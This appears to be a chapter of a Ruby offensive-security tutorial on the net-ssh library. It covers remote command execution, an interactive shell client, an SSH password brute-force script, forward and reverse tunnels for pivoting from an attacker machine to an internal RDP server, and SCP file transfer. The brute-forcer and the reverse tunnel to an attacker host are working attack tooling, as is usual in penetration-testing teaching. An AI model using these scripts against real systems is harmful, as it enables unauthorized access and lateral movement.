# SSH
Here we'll show some SSH using ruby. However, we'll need to install net-ssh gem for that.

- To install net-ssh
```
gem install net-ssh
```

## Simple SSH command execution 
This is a very basic ssh client which sends and executes commands on a remote system 
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

@hostname = "localhost"
@username = "root"
@password = "password"
@cmd = ARGV[0]

begin
  ssh = Net::SSH.start(@hostname, @username, :password => @password)
  res = ssh.exec!(@cmd)
  ssh.close
  puts res
rescue
  puts "Unable to connect to #{@hostname} using #{@username}/#{@password}"
end
```

## SSH Client with PTY shell
Here a simple ssh client which give you an interactive PTY

```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

@hostname = "localhost"
@username = "root"
@password = "password"
@cmd = ARGV[0]

Net::SSH.start(@hostname, @username, :password => @password, :auth_methods => ["password"]) do |session|

  # Open SSH channel 
  session.open_channel do |channel|
    
    # Requests that a pseudo-tty (or "pty") for interactive application-like (e.g vim, sudo, etc)
    channel.request_pty do |ch, success| 
      raise "Error requesting pty" unless success 

      # Request channel type shell
      ch.send_channel_request("shell") do |ch, success| 
        raise "Error opening shell" unless success
    	STDOUT.puts "[+] Getting Remote Shell\n\n" if success
      end
    end

    # Print STDERR of the remote host to my STDOUT
    channel.on_extended_data do |ch, type, data|
      STDOUT.puts "Error: #{data}\n"
    end

    # When data packets are received by the channel
    channel.on_data do |ch, data|
      STDOUT.print data
      cmd = gets
      channel.send_data( "#{cmd}" ) 
      trap("INT") {STDOUT.puts "Use 'exit' or 'logout' command to exit the session"}
    end
    
    channel.on_eof do |ch|
      puts "Exiting SSH Session.."
    end
    
    session.loop
  end
end
```

## SSH Bruteforce 

**ssh-bf.rb**
```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
#
require 'net/ssh'

def attack_ssh(host, user, password, port=22, timeout = 5)
  begin
    Net::SSH.start(host, user, :password => password, 
        		   :auth_methods => ["password"], :port => port, 
        		   :paranoid => false, :non_interactive => true, :timeout => timeout ) do |session|
      puts "Password Found: " + "#{host} | #{user}:#{password}" 
    end


  rescue Net::SSH::ConnectionTimeout
    puts "[!] The host '#{host}' not alive!"
  rescue Net::SSH::Timeout
    puts "[!] The host '#{host}' disconnected/timeouted unexpectedly!"
  rescue Errno::ECONNREFUSED
    puts "[!] Incorrect port #{port} for #{host}"
  rescue Net::SSH::AuthenticationFailed
    puts "Wrong Password: #{host} | #{user}:#{password}" 
  rescue Net::SSH::Authentication::DisallowedMethod
    puts "[!] The host '#{host}' dosn't accept password authentication method."
  end
end


hosts = ['192.168.0.1', '192.168.0.4', '192.168.0.50']
users = ['root', 'admin', 'rubyfu']
passs = ['admin1234', 'P@ssw0rd', '123456', 'AdminAdmin', 'secret', coffee]

hosts.each do |host|
  users.each do |user|     
    passs.each do |password|
      
      attack_ssh host, user, password
  
end end end
```

## SSH Tunneling

### Forward SSH Tunnel

```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| ----SSH Tunnel---> | |SSH Server| <-RDP-> |Web server| |
                              |                 |                 |
                              |-----------------|-----------------|
```

Run ssh-ltnnel.rb on the **SSH Server** 

**ssh-ftunnel.rb**
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|

  ssh.forward.local('0.0.0.0', 3333, "WebServer", 3389)

  puts "[+] Starting SSH forward tunnel"
  ssh.loop { true }
end
```

Now connect to the **SSH Server** on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen

```
rdesktop WebServer:3333
```


### Reverse SSH Tunnel 
```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| <---SSH Tunnel---- | |SSH Server| <-RDP-> |Web server| |
  |->-|                       |                 |                 |
                              |-----------------|-----------------|
```
Run ssh-rtnnel.rb on the **SSH Server** 

**ssh-rtunnel.rb**
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
require 'net/ssh'

Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|

  ssh.forward.remote_to(3389, 'WebServer', 3333, '0.0.0.0')
  
  puts "[+] Starting SSH reverse tunnel"
  ssh.loop { true }
end
```

Now SS from the **SSH Server** to **localhost** on the localhost's ssh port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen

```
rdesktop localhost:3333
```



## Copy files via SSH (SCP)

- To install scp gem
```
gem install net-scp
```

- Upload file 

```ruby
require 'net/scp'

Net::SCP.upload!(
    		        "SSHServer", 
                    "root",
                    "/rubyfu/file.txt", "/root/", 
                    #:recursive => true,    # Uncomment for recursive
                    :ssh => { :password => "123123" }
                )
```

- Download file 

```ruby
require 'net/scp'

Net::SCP.download!(
    		        "SSHServer", 
                    "root",
                    "/root/", "/rubyfu/file.txt",
                    #:recursive => true,    # Uncomment for recursive
                    :ssh => { :password => "123123" }
                  )
```




<br><br><br>
---
- [More SSH examples](http://ruby.about.com/sitesearch.htm?q=ruby+ssh&boost=3&SUName=ruby)
- [Capistranorb.com](http://capistranorb.com/)
- [Net:SSH old docs with example](http://net-ssh.github.io/ssh/v1/chapter-6.html)



